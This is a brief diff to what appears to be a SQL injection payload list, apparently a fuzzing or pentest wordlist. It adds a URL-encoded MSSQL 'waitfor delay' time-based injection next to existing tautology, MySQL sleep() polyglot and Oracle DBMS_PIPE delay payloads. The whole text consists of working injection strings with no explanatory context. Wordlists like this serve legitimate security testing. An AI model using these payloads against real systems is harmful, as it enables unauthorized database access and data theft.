@@ -1,4 +1,5 @@
 )%20or%20('x'='x
+`';%20waitfor%20delay%20'0:0:6'%20--%20`
 %20or%201=1
 (select(0)from(select(sleep(13)))v)/*'+(select(0)from(select(sleep(13)))v)+'\"+(select(0)from(select(sleep(13)))v)+\"*/
 '||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),10)||'
